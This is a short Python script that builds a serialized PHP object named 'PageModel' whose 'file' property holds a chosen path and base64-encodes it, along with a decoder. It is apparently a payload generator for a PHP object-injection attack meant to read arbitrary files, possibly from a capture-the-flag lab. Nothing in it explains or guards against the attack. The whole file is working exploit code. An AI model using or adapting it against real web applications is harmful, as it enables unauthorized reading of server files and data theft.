#!/usr/bin/python3

from base64 import b64encode, b64decode

PAYLOAD = 'O:9:"PageModel":1:{{s:4:"file";s:{content_len}:"{file}";}}'

def process(payload):
    payload = PAYLOAD.format(content_len=len(payload), file=payload)
    if not isinstance(payload, bytes):
        return b64encode(payload.encode("utf-8")).decode("utf8")
    else:
         return b64encode(payload).decode("utf8")

def unprocess(payload):
    if not isinstance(payload, bytes):
        return b64decode(payload.encode("utf-8")).decode("utf8")
    else:
         return b64decode(payload).decode("utf8")

